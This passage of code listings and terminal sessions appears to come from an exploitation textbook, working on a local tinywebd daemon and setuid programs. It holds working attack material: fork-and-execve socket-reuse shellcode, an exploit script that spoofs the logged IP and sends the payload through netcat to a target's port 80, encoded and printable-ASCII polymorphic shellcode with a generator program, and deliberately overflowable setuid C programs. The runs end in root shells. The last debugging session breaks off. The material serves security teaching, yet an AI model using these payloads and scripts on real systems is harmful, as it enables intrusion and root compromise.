0x8048fc3: file tinywebd.c, line 86.\n(gdb) cont\nContinuing.\n```", "```\nBreakpoint 1, handle_connection (sockfd=13, client_addr_ptr=0xbffff810, logfd=3) at\ntinywebd.c:86\n86         length = recv_line(sockfd, request);\n(gdb) x/x &sockfd\n0xbffff7e0:     0x0000000d\n(gdb) x/x &new_sockfd\nNo symbol \"new_sockfd\" in current context.\n(gdb) bt\n#0  handle_connection (sockfd=13, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86\n#1  0x08048fb7 in main () at tinywebd.c:72\n(gdb) select-frame 1\n(gdb) x/x &new_sockfd\n0xbffff83c:     0x0000000d\n(gdb) quit\nThe program is running.  Quit anyway (and detach it)? (y or n) y\nDetaching from program: , process 478\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q\n(gdb) print /x 0xbffff83c - 0xbffff7e0\n$1 = 0x5c\n(gdb)\n```", "```\nBITS 32\n\n   push BYTE 0x02    ; Fork is syscall #2\n   pop eax\n   int 0x80          ; After the fork, in child process eax == 0.\n   test eax, eax\n   jz child_process  ; In child process spawns a shell.\n\n      ; In the parent process, restore tinywebd.\n   lea ebp, [esp+0x68]  ; Restore EBP.\n   push 0x08048fb7      ; Return address.\n   ret                  ; Return.\n\nchild_process:\n      ; Re-use existing socket.\n   lea edx, [esp+0x5c]  ; Put the address of new_sockfd in edx.\n   mov ebx, [edx]       ; Put the value of new_sockfd in ebx.\n   push BYTE 0x02\n   pop ecx          ; ecx starts at 2.\n   xor eax, eax\n   xor edx, edx\ndup_loop:\n   mov BYTE al, 0x3F ; dup2  syscall #63\n   int 0x80          ; dup2(c, 0)\n   dec ecx           ; Count down to 0.\n   jns dup_loop      ; If the sign flag is not set, ecx is not negative.\n\n; execve(const char *filename, char *const argv [], char *const envp[])\n   mov BYTE al, 11   ; execve  syscall #11\n   push edx          ; push some nulls for string termination.\n   push 0x68732f2f   ; push \"//sh\" to the stack.\n   push 0x6e69622f   ; push \"/bin\" to the stack.\n   mov ebx, esp      ; Put the address of \"/bin//sh\" into ebx, via esp.\n   push edx          ; push 32-bit null terminator to stack.\n   mov edx, esp      ; This is an empty array for envp.\n   push ebx          ; push string addr to stack above null terminator.\n   mov ecx, esp      ; This is the argv array with string ptr.\n   int 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\n```", "```\n#!/bin/sh\n# Silent stealth exploitation tool for tinywebd\n#    also spoofs IP address stored in memory\n`#    reuses existing socket-use socket_reuse shellcode`\n\nSPOOFIP=\"12.34.56.78\"\nSPOOFPORT=\"9090\"\n\nif [ -z \"$2\" ]; then  # if argument 2 is blank\n   echo \"Usage: $0 <shellcode file> <target IP>\"\n   exit\nfi\nFAKEREQUEST=\"GET / HTTP/1.1\\x00\"\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # at +100 bytes from buffer @ 0xbffff5c0\nFAKEADDR=\"\\xcf\\xf5\\xff\\xbf\" # +15 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))\n\necho \"[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE]\n [ret\naddr 128] [*fake_addr 8]\"\n(perl -e \"print \\\"$FAKEREQUEST\\\"\";\n ./addr_struct \"$SPOOFIP\" \"$SPOOFPORT\";\n perl -e \"print \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\n cat $1;\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"$FAKEADDR\\\"x2 . \\\"\\x01\\x00\\x00\\x00\\r\\n\\\"\";\n`cat` -;) | nc -v $2 80\n```", "```\nreader@hacking:~/booksrc $ nasm socket_reuse_restore.s\nreader@hacking:~/booksrc $ hexdump -C socket_reuse_restore\n00000000  6a 02 58 cd 80 85 c0 74  0a 8d 6c 24 68 68 b7 8f  |j.X..t.l$hh.|\n00000010  04 08 c3 8d 54 24 5c 8b  1a 6a 02 59 31 c0 31 d2  |..T$\\.j.Y1.1.|\n00000020  b0 3f cd 80 49 79 f9 b0  0b 52 68 2f 2f 73 68 68  |.?.Iy..Rh//shh|\n00000030  2f 62 69 6e 89 e3 52 89  e2 53 89 e1 cd 80        |/bin.R.S..|\n0000003e\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh socket_reuse_restore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: socket_reuse_restore (62 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 323] [shellcode 62] [ret addr 128] [*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\nwhoami\nroot\n```", "```\nreader@hacking:~/booksrc $ echo \"/bin/sh\" | hexdump -C\n00000000  2f 62 69 6e 2f 73 68 0a                           |/bin/sh.|\n00000008\nreader@hacking:~/booksrc $ gdb -q\n(gdb) print /x 0x0068732f + 0x05050505\n$1 = 0x56d7834\n(gdb) print /x 0x6e69622f + 0x05050505\n$2 = 0x736e6734\n(gdb) quit\nreader@hacking:~/booksrc $\n```", "```\nBITS 32\n\n   push BYTE 0x02    ; Fork is syscall #2.\n   pop eax\n   int 0x80          ; After the fork, in child process eax == 0.\n   test eax, eax\n   jz child_process  ; In child process spawns a shell.\n\n      ; In the parent process, restore tinywebd.\n   lea ebp, [esp+0x68]  ; Restore EBP.\n   push 0x08048fb7      ; Return address.\n   ret                  ; Return\n\nchild_process:\n    ; Re-use existing socket.\n   lea edx, [esp+0x5c]  ; Put the address of new_sockfd in edx.\n   mov ebx, [edx]       ; Put the value of new_sockfd in ebx.\n   push BYTE 0x02\n   pop ecx          ; ecx starts at 2.\n   xor eax, eax\ndup_loop:\n   mov BYTE al, 0x3F ; dup2  syscall #63\n   int 0x80          ; dup2(c, 0)\n   dec ecx           ; Count down to 0.\n   jns dup_loop      ; If the sign flag is not set, ecx is not negative\n\n; execve(const char *filename, char *const argv [], char *const envp[])\n   mov BYTE al, 11   ; execve  syscall #11\n   push 0x056d7834   ; push \"/sh\\x00\" encoded +5 to the stack.\n   push 0x736e6734   ; push \"/bin\" encoded +5 to the stack.\n   mov ebx, esp      ; Put the address of encoded \"/bin/sh\" into ebx.\n\nint3 ; Breakpoint before decoding (REMOVE WHEN NOT DEBUGGING)\n\n   push BYTE 0x8     ; Need to decode 8 bytes\n   pop edx\ndecode_loop:\n   sub BYTE [ebx+edx], 0x5\n   dec edx\n   jns decode_loop\n\nint3  ; Breakpoint after decoding (REMOVE WHEN NOT DEBUGGING)\n\n   xor edx, edx\n   push edx          ; push 32-bit null terminator to stack.\n   mov edx, esp      ; This is an empty array for envp.\n   push ebx          ; push string addr to stack above null terminator.\n   mov ecx, esp      ; This is the argv array with string ptr.\n   int 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\n```", "```\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q ./a.out\n\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) set disassembly-flavor intel\n(gdb) set follow-fork-mode child\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nStarting tiny web daemon..\n```", "```\nreader@hacking:~/booksrc $ nasm encoded_sockreuserestore_dbg.s\nreader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh encoded_socketreuserestore_dbg\n 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: encoded_sockreuserestore_dbg (72 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 313] [shellcode 72] [ret addr 128] [*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\n```", "```\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n[Switching to process 12400]\n0xbffff6ab in ?? ()\n(gdb) x/10i $eip\n0xbffff6ab:     push   0x8\n0xbffff6ad:     pop    edx\n0xbffff6ae:     sub    BYTE PTR [ebx+edx],0x5\n0xbffff6b2:     dec    edx\n0xbffff6b3:     jns    0xbffff6ae\n0xbffff6b5     int3\n0xbffff6b6:     xor    edx,edx\n0xbffff6b8:     push   edx\n0xbffff6b9:     mov    edx,esp\n0xbffff6bb:     push   ebx\n(gdb) x/8c $ebx\n0xbffff738:     52 '4'  103 'g' 110 'n' 115 's' 52 '4'  120 'x' 109 'm' 5 '\\005'\n(gdb) cont\nContinuing.\n[tcsetpgrp failed in terminal_inferior: Operation not permitted]\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0xbffff6b6 in ?? ()\n(gdb) x/8c $ebx\n0xbffff738:     47 '/'  98 'b'  105 'i' 110 'n' 47 '/'  115 's' 104 'h' 0 '\\0'\n(gdb) x/s $ebx\n0xbffff738:      \"/bin/sh\"\n(gdb)\n```", "```\nreader@hacking:~/booksrc $ sed -e 's/int3/;int3/g' encoded_sockreuserestore_dbg.s >\nencoded_sockreuserestore.s\nreader@hacking:~/booksrc $ diff encoded_sockreuserestore_dbg.s encoded_sockreuserestore.s\n 33c33\n< int3  ; Breakpoint before decoding  (REMOVE WHEN NOT DEBUGGING)\n> ;int3  ; Breakpoint before decoding  (REMOVE WHEN NOT DEBUGGING)\n42c42\n< int3  ; Breakpoint after decoding  (REMOVE WHEN NOT DEBUGGING)\n> ;int3  ; Breakpoint after decoding  (REMOVE WHEN NOT DEBUGGING)\nreader@hacking:~/booksrc $ nasm encoded_sockreuserestore.s\nreader@hacking:~/booksrc $ hexdump -C encoded_sockreuserestore\n00000000  6a 02 58 cd 80 85 c0 74  0a 8d 6c 24 68 68 b7 8f  |j.X....t..l$hh..|\n00000010  04 08 c3 8d 54 24 5c 8b  1a 6a 02 59 31 c0 b0 3f  |....T$\\..j.Y1..?|\n00000020  cd 80 49 79 f9 b0 0b 68  34 78 6d 05 68 34 67 6e  |..Iy...h4xm.h4gn|\n00000030  73 89 e3 6a 08 5a 80 2c  13 05 4a 79 f9 31 d2 52  |s..j.Z.,..Jy.1.R|\n00000040  89 e2 53 89 e1 cd 80                              |..S....|\n00000047\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon..\nreader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh encoded_sockreuserestore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: encoded_sockreuserestore (71 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 314] [shellcode 71] [ret addr 128] [*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\nwhoami\nroot\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define MAX_ID_LEN 40\n#define MAX_DESC_LEN 500\n\n/* Barf a message and exit. */\nvoid barf(char *message, void *extra) {\n   printf(message, extra);\n   exit(1);\n}\n\n/* Pretend this function updates a product description in a database. */\nvoid update_product_description(char *id, char *desc)\n{\n   char product_code[5], description[MAX_DESC_LEN];\n\n   printf(\"[DEBUG]: description is at %p\\n\", description);\n\n   strncpy(description, desc, MAX_DESC_LEN);\n   strcpy(product_code, id);\n\n   printf(\"Updating product #%s with description \\'%s\\'\\n\", product_code, desc);\n   // Update database\n}\n\nint main(int argc, char *argv[], char *envp[])\n{\n  int i;\n  char *id, *desc;\n\n  if(argc < 2)\n     barf(\"Usage: %s <id> <description>\\n\", argv[0]);\n  id = argv[1];   // id - Product code to update in DB \n  desc = argv[2]; // desc - Item description to update\n\n  if(strlen(id) > MAX_ID_LEN) // id must be less than MAX_ID_LEN bytes.\n     barf(\"Fatal: id argument must be less than %u bytes\\n\", (void *)MAX_ID_LEN);\n\n  for(i=0; i < strlen(desc)-1; i++) { // Only allow printable bytes in desc.\n     if(!(isprint(desc[i])))\n        barf(\"Fatal: description argument can only contain printable bytes\\n\", NULL);\n  }\n\n  // Clearing out the stack memory (security)\n  // Clearing all arguments except the first and second\n  memset(argv[0], 0, strlen(argv[0]));\n  for(i=3; argv[i] != 0; i++)\n    memset(argv[i], 0, strlen(argv[i]));\n  // Clearing all environment variables\n  for(i=0; envp[i] != 0; i++)\n    memset(envp[i], 0, strlen(envp[i]));\n\n  printf(\"[DEBUG]: desc is at %p\\n\", desc);\n\n  update_product_description(id, desc); // Update database.\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o update_info update_info.c\nreader@hacking:~/booksrc $ sudo chown root ./update_info\nreader@hacking:~/booksrc $ sudo chmod u+s ./update_info\nreader@hacking:~/booksrc $ ./update_info\nUsage: ./update_info <id> <description>\nreader@hacking:~/booksrc $ ./update_info OCP209 \"Enforcement Droid\"\n[DEBUG]: description is at 0xbffff650\nUpdating product #OCP209 with description 'Enforcement Droid'\nreader@hacking:~/booksrc $\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"AAAA\"x10') blah\n[DEBUG]: description is at 0xbffff650\nSegmentation fault\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"\\xf2\\xf9\\xff\\xbf\"x10') $(cat ./\nshellcode.bin)\nFatal: description argument can only contain printable bytes\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q ./update_info\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\"\n(gdb) run $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x10') blah\nThe program being debugged has been started already\nStart it from the beginning? (y or n) y\n\nStarting program: /home/reader/booksrc/update_info $(perl -e 'print \"\\xcb\\xf9\\xff\\\nxbf\"x10')\nblah\n[DEBUG]: desc is at 0xbffff9cb\nUpdating product # with description 'blah'\n\nProgram received signal SIGSEGV, Segmentation fault.\n0xbffff9cb in ?? ()\n(gdb) i r eip\neip            0xbffff9cb       0xbffff9cb\n(gdb) x/s $eip\n0xbffff9cb:      \"blah\"\n(gdb)\n```", "```\n1 and 1 = 1\n0 and 0 = 0\n1 and 0 = 0\n0 and 1 = 0\n```", "```\n    `Binary                                Hexadecimal`\n    1000101010011100100111101001010       0x454e4f4a\nAND 0111010001100010011000000110101   AND 0x3a313035\n------------------------------------  --------------- \n    0000000000000000000000000000000       0x00000000\n```", "```\nand eax, 0x454e4f4a  ; Assembles into %JONE\nand eax, 0x3a313035  ; Assembles into %501:\n```", "```\nsub eax, 0x41414141    -AAAA\npush eax               P\npop eax                X\npush esp               T\npop esp                \\\n```", "```\nsub eax, 0x39393333  ; Assembles into -3399\nsub eax, 0x72727550  ; Assembles into -Purr\nsub eax, 0x54545421  ; Assembles into -!TTT\n```", "```\nreader@hacking:~/booksrc $ gdb -q\n(gdb) print  0 - 0x39393333 - 0x72727550 - 0x54545421\n$1 = 860\n(gdb)\n```", "```\npush esp             ; Assembles into T\npop eax              ; Assembles into X\n\nsub eax, 0x39393333  ; Assembles into -3399\nsub eax, 0x72727550  ; Assembles into -Purr\nsub eax, 0x54545421  ; Assembles into -!TTT\n\npush eax             ; Assembles into P\npop esp              ; Assembles into \\\n```", "```\nreader@hacking:~/booksrc $ hexdump -C ./shellcode.bin\n00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|\n00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3  *`51 89 e2 53`* `89`  |//shh/bin..Q..S.|\n00000020  `e1 cd 80`                                          |...|\n```", "```\n00000000  *`31 c0 31`* `db 31 c9 99` b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|\n00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 *`51 89 e2 53`* `89`  |//shh/bin..Q..S.|\n00000020  `e1 cd 80`                                          |...|\n```", "```\n#include <stdio.h>\n#include <sys/stat.h>\n#include <ctype.h>\n#include <time.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define CHR \"%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-\"\n\nint main(int argc, char* argv[])\n{\n   unsigned int targ, last, t[4], l[4];\n   unsigned int try, single, carry=0;\n   int len, a, i, j, k, m, z, flag=0;\n   char word[3][4];\n   unsigned char mem[70];\n\n   if(argc < 2) {\n      printf(\"Usage: %s <EAX starting value> <EAX end value>\\n\", argv[0]);\n      exit(1);\n   }\n\n   srand(time(NULL));\n   bzero(mem, 70);\n   strcpy(mem, CHR);\n   len = strlen(mem);\n   strfry(mem); // Randomize\n   last = strtoul(argv[1], NULL, 0);\n   targ = strtoul(argv[2], NULL, 0);\n\n   printf(\"calculating printable values to subtract from EAX..\\n\\n\");\n   t[3] = (targ & 0xff000000)>>24; // Splitting by bytes\n   t[2] = (targ & 0x00ff0000)>>16;\n   t[1] = (targ & 0x0000ff00)>>8;\n   t[0] = (targ & 0x000000ff);\n   l[3] = (last & 0xff000000)>>24;\n   l[2] = (last & 0x00ff0000)>>16;\n   l[1] = (last & 0x0000ff00)>>8;\n   l[0] = (last & 0x000000ff);\n\n   for(a=1; a < 5; a++) { // Value count\n      carry = flag = 0;\n      for(z=0; z < 4; z++) { // Byte count\n         for(i=0; i < len; i++) {\n            for(j=0; j < len; j++) {\n               for(k=0; k < len; k++) {\n                  for(m=0; m < len; m++)\n                  {\n                     if(a < 2) j = len+1;\n                     if(a < 3) k = len+1;\n                     if(a < 4) m = len+1;\n                     try = t[z] + carry+mem[i]+mem[j]+mem[k]+mem[m];\n                     single = (try & 0x000000ff);\n                     if(single == l[z])\n                     {\n                        carry = (try & 0x0000ff00)>>8;\n                        if(i < len) word[0][z] = mem[i];\n                        if(j < len) word[1][z] = mem[j];\n                        if(k < len) word[2][z] = mem[k];\n                        if(m < len) word[3][z] = mem[m];\n                        i = j = k = m = len+2;\n                        flag++;\n                     }\n                  }\n               }\n            }\n         }\n      }\n      if(flag == 4) { // If all 4 bytes found\n         printf(\"start: 0x%08x\\n\\n\", last);\n         for(i=0; i < a; i++)\n            printf(\"     - 0x%08x\\n\", *((unsigned int *)word[i]));\n         printf(\"-------------------\\n\");\n         printf(\"end:   0x%08x\\n\", targ);\n\n         exit(0);\n      }\n   }\n```", "```\nreader@hacking:~/booksrc $ gcc -o printable_helper printable_helper.c\nreader@hacking:~/booksrc $ ./printable_helper 0 0x80cde189\ncalculating printable values to subtract from EAX..\n\nstart: 0x00000000\n\n     - 0x346d6d25\n     - 0x256d6d25\n     - 0x2557442d\n-------------------\nend:   0x80cde189\nreader@hacking:~/booksrc $ hexdump -C ./shellcode.bin \n00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|\n00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 51 89 e2 53 `89`  |//shh/bin..Q..S.|\n00000020  `e1 cd 80`                                          |...|\n00000023\nreader@hacking:~/booksrc $ ./printable_helper 0x80cde189 0x53e28951\ncalculating printable values to subtract from EAX..\n\nstart: 0x80cde189\n\n     - 0x59316659\n     - 0x59667766\n     - 0x7a537a79\n-------------------\nend:   0x53e28951 \nreader@hacking:~/booksrc $\n```", "```\nBITS 32\npush esp                ; Put current ESP\npop eax                 ;   into EAX.\nsub eax,0x39393333      ; Subtract printable values\nsub eax,0x72727550      ;   to add 860 to EAX.\nsub eax,0x54545421\npush eax                ; Put EAX back into ESP.\npop esp                 ;   Effectively ESP = ESP + 860\nand eax,0x454e4f4a\nand eax,0x3a313035      ; Zero out EAX.\n\nsub eax,0x346d6d25      ; Subtract printable values \nsub eax,0x256d6d25      ;   to make EAX = 0x80cde189.\nsub eax,0x2557442d      ;   (last 4 bytes from shellcode.bin)\npush eax                ; Push these bytes to stack at ESP.\nsub eax,0x59316659      ; Subtract more printable values\nsub eax,0x59667766      ;  to make EAX = 0x53e28951.\nsub eax,0x7a537a79      ;  (next 4 bytes of shellcode from the end)\n\npush eax\nsub eax,0x25696969\nsub eax,0x25786b5a\nsub eax,0x25774625\npush eax                ; EAX = 0xe3896e69\nsub eax,0x366e5858\nsub eax,0x25773939\nsub eax,0x25747470\npush eax                ; EAX = 0x622f6868\nsub eax,0x25257725\nsub eax,0x71717171\nsub eax,0x5869506a\npush eax                ; EAX = 0x732f2f68\nsub eax,0x63636363\nsub eax,0x44307744\nsub eax,0x7a434957\npush eax                ; EAX = 0x51580b6a\nsub eax,0x63363663\nsub eax,0x6d543057\npush eax                ; EAX = 0x80cda4b0\nsub eax,0x54545454\nsub eax,0x304e4e25\nsub eax,0x32346f25\nsub eax,0x302d6137\npush eax                ; EAX = 0x99c931db\nsub eax,0x78474778\nsub eax,0x78727272\nsub eax,0x774f4661\npush eax                ; EAX = 0x31c03190\nsub eax,0x41704170\nsub eax,0x2d772d4e\nsub eax,0x32483242\npush eax                ; EAX = 0x90909090\npush eax\npush eax                ; Build a NOP sled.\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\n\n```", "```\nreader@hacking:~/booksrc $ nasm printable.s\nreader@hacking:~/booksrc $ echo $(cat ./printable)\nTX-3399-Purr-!TTTP\\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%\n-ptt%P-\n%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--\nB2H2PPPPPPPPPPPPPPPPPPPPPP\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"AAAA\"x10') $(cat ./printable)\n[DEBUG]: desc argument is at 0xbffff910\nSegmentation fault\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"\\x10\\xf9\\xff\\xbf\"x10') $(cat ./\nprintable)\n[DEBUG]: desc argument is at 0xbffff910\nUpdating product ########### with description 'TX-3399-Purr-!TTTP\\%JONE%501:-%mm4-%mm%\n--DW%P-\nYf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c\n-W0TmP-\nTTTT-%NN0-%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP'\nsh-3.2# whoami\nroot\nsh-3.2#\n```", "```\nreader@hacking:~/booksrc $ gdb -q ./update_info\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass update_product_description\nDump of assembler code for function update_product_description:\n0x080484a8 <update_product_description+0>:      push   ebp\n0x080484a9 <update_product_description+1>:      mov    ebp,esp\n0x080484ab <update_product_description+3>:      sub    esp,0x28\n0x080484ae <update_product_description+6>:      mov    eax,DWORD PTR [ebp+8]\n0x080484b1 <update_product_description+9>:      mov    DWORD PTR [esp+4],eax\n0x080484b5 <update_product_description+13>:     lea    eax,[ebp-24]\n0x080484b8 <update_product_description+16>:     mov    DWORD PTR [esp],eax\n0x080484bb <update_product_description+19>:     call   0x8048388 <strcpy@plt>\n0x080484c0 <update_product_description+24>:     mov    eax,DWORD PTR [ebp+12]\n0x080484c3 <update_product_description+27>:     mov    DWORD PTR [esp+8],eax\n0x080484c7 <update_product_description+31>:     lea    eax,[ebp-24]\n0x080484ca <update_product_description+34>:     mov    DWORD PTR [esp+4],eax\n0x080484ce <update_product_description+38>:     mov    DWORD PTR [esp],0x80487a0\n0x080484d5 <update_product_description+45>:     call   0x8048398 <printf@plt>\n0x080484da <update_product_description+50>:     leave\n0x080484db <update_product_description+51>:     ret\nEnd of assembler dump.\n(gdb) break *0x080484db\nBreakpoint 1 at 0x80484db: file update_info.c, line 21.\n(gdb) run $(perl -e 'print \"AAAA\"x10') $(cat ./printable)\nStarting program: /home/reader/booksrc/update_info $(perl -e 'print \"AAAA\"x10') $(cat ./\nprintable)\n[DEBUG]: desc argument is at 0xbffff8fd\n\nProgram received signal SIGSEGV, Segmentation fault.\n0xb7f06bfb in strlen () from /lib/tls/i686/cmov/libc.so.6\n(gdb) run $(perl -e 'print \"\\xfd\\xf8\\xff\\xbf\"x10') $(cat ./printable)\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/reader/booksrc/update_info $(perl -e 'print \"\\xfd\\xf8\\xff\\xbf\"\nx10')\n$(cat ./printable)\n[DEBUG]: desc argument is at 0xbffff8fd\nUpdating product # with description 'TX-3399-Purr-!TTTP\\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y\n-fwfY-\nyzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT\n-%NN0-\n%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP'\n\nBreakpoint 1, 0x080484db in update_product_description (\n    id=0x72727550 <Address 0x72727550 out of bounds>,\n    desc=0x5454212d <Address 0x5454212d out of bounds>) at update_info.c:21\n21      }\n(gdb)  stepi\n0xbffff8fd in ?? ()\n(gdb) x/9i $eip\n0xbffff8fd:     push   esp\n0xbffff8fe:     pop    eax\n0xbffff8ff:     sub    eax,0x39393333\n0xbffff904:     sub    eax,0x72727550\n0xbffff909:     sub    eax,0x54545421\n0xbffff90e:     push   eax\n0xbffff90f:     pop    esp\n0xbffff910:     and    eax,0x454e4f4a\n0xbffff915:     and    eax,0x3a313035\n(gdb) i r esp\nesp            0xbffff6d0       0xbffff6d0\n(gdb) p /x $esp + 860\n$1 = 0xbffffa2c\n(gdb) stepi 9\n0xbffff91a in ?? ()\n(gdb) i r esp eax\nesp            0xbffffa2c       0xbffffa2c\neax            0x0      0\n(gdb)\n```", "```\n(gdb) x/8i $eip\n0xbffff91a:     sub    eax,0x346d6d25\n0xbffff91f:     sub    eax,0x256d6d25\n0xbffff924:     sub    eax,0x2557442d\n0xbffff929:     push   eax\n0xbffff92a:     sub    eax,0x59316659\n0xbffff92f:     sub    eax,0x59667766\n0xbffff934:     sub    eax,0x7a537a79\n0xbffff939:     push   eax\n(gdb) stepi 8\n0xbffff93a in ?? ()\n(gdb) x/4x $esp\n0xbffffa24:     0x53e28951      0x80cde189      0x00000000      0x00000000\n(gdb) stepi 32\n0xbffff9ba in ?? ()\n(gdb) x/5i $eip\n0xbffff9ba:     push   eax\n0xbffff9bb:     push   eax\n0xbffff9bc:     push   eax\n0xbffff9bd:     push   eax\n0xbffff9be:     push   eax\n(gdb) x/16x $esp\n0xbffffa04:     0x90909090      0x31c03190      0x99c931db      0x80cda4b0\n0xbffffa14:     0x51580b6a      0x732f2f68      0x622f6868      0xe3896e69\n0xbffffa24:     0x53e28951      0x80cde189      0x00000000      0x00000000\n0xbffffa34:     0x00000000      0x00000000      0x00000000      0x00000000\n(gdb)  i r eip esp eax\neip            0xbffff9ba       0xbffff9ba\nesp            0xbffffa04       0xbffffa04\neax            0x90909090       -1869574000\n(gdb)\n```", "```\n(gdb) x/24x 0xbffff9ba\n0xbffff9ba:     0x50505050      0x50505050      0x50505050      0x50505050\n0xbffff9ca:     0x50505050      0x00000050      0x00000000      0x00000000\n0xbffff9da:     0x00000000      0x00000000      0x00000000      0x00000000\n0xbffff9ea:     0x00000000      0x00000000      0x00000000      0x00000000\n0xbffff9fa:     0x00000000      0x00000000      0x90900000      0x31909090\n0xbffffa0a:     0x31db31c0      0xa4b099c9      0x0b6a80cd      0x2f685158\n(gdb) stepi 10\n0xbffff9c4 in ?? ()\n(gdb) x/24x 0xbffff9ba\n0xbffff9ba:     0x50505050      0x50505050      0x50505050      0x50505050\n0xbffff9ca:     0x50505050      0x00000050      0x00000000      0x00000000\n0xbffff9da:     0x90900000      0x90909090      0x90909090      0x90909090\n0xbffff9ea:     0x90909090      0x90909090      0x90909090      0x90909090\n0xbffff9fa:     0x90909090      0x90909090      0x90909090      0x31909090\n0xbffffa0a:     0x31db31c0      0xa4b099c9      0x0b6a80cd      0x2f685158\n(gdb) stepi 5\n0xbffff9c9 in ?? ()\n(gdb) x/24x 0xbffff9ba\n0xbffff9ba:     0x50505050      0x50505050      0x50505050      0x90905050\n0xbffff9ca:     0x90909090      0x90909090      0x90909090      0x90909090\n0xbffff9da:     0x90909090      0x90909090      0x90909090      0x90909090\n0xbffff9ea:     0x90909090      0x90909090      0x90909090      0x90909090\n0xbffff9fa:     0x90909090      0x90909090      0x90909090      0x31909090\n0xbffffa0a:     0x31db31c0      0xa4b099c9      0x0b6a80cd      0x2f685158\n(gdb)\n```", "```\nint main(int argc, char *argv[])\n{\n        char buffer[5];\n        strcpy(buffer, argv[1]);\n        return 0;\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o vuln vuln.c\nreader@hacking:~/booksrc $ sudo chown root ./vuln\nreader@hacking:~/booksrc $ sudo chmod u+s ./vuln\nreader@hacking:~/booksrc $ ls -l ./vuln\n-rwsr-xr-x 1 root reader 6600 2007-09-30 22:43 ./vuln\n\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ cat > dummy.c\nint main()\n{ system(); }\nreader@hacking:~/booksrc $ gcc -o dummy dummy.c\nreader@hacking:~/booksrc $ gdb -q ./dummy\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) break 